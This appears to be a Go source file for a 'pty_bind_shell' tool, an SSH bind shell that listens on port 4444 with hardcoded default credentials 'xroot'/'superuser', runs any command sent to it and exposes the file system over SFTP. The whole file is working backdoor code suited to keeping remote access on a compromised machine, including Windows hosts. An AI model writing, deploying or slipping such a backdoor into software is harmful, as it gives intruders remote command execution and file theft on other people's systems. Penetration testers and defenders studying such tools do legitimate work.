package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"

	"github.com/akamensky/argparse"
	"github.com/fatih/color"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	"golang.org/x/term"
)

func SftpHandler(sess ssh.Session) {

	debugStream := os.Stdout
	serverOptions := []sftp.ServerOption{
		sftp.WithDebug(debugStream),
	}
	server, err := sftp.NewServer(
		sess,
		serverOptions...,
	)
	if err != nil {
		return
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
	}

}
func simpleCommandShellHandler(s ssh.Session) {
	term := term.NewTerminal(s, "> ")
	for {
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		in := strings.Split(line, " ")
		if in[0] == "" {
			continue
		}
		if in[0] == "exit" {
			break
		}
		exe := exec.Command(in[0], in[1:]...)
		out, err := exe.Output()
		if err != nil {
			term.Write([]byte(err.Error() + "\n"))
		}
		term.Write(out)
	}
}
func exit_on_error(message string, err error) {
	if err != nil {
		color.Red(message)
		fmt.Println(err)
		os.Exit(0)
	}
}

func main() {
	parser := argparse.NewParser("pty_bind_shell", "")
	var HOST *string = parser.String("H", "host", &argparse.Options{Required: false, Default: "0.0.0.0", Help: "Host to bind or connect to"})
	var PORT *string = parser.String("P", "port", &argparse.Options{Required: false, Default: "4444", Help: "Port to bind or connect to"})
	var USERNAME *string = parser.String("u", "username", &argparse.Options{Required: false, Default: "xroot", Help: "SSH username"})
	var PASSWORD *string = parser.String("p", "password", &argparse.Options{Required: false, Default: "superuser", Help: "SSH password"})
	err := parser.Parse(os.Args)
	exit_on_error("[PARSER ERROR]", err)
	server := ssh.Server{
		Addr: *HOST + ":" + *PORT, // IP and PORT to connect on
		PasswordHandler: ssh.PasswordHandler(func(ctx ssh.Context, pass string) bool {
			return pass == *PASSWORD && ctx.User() == *USERNAME
		}),
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
		Handler: func(s ssh.Session) {
			io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
			simpleCommandShellHandler(s)
		},
	}
	server.ListenAndServe()
}
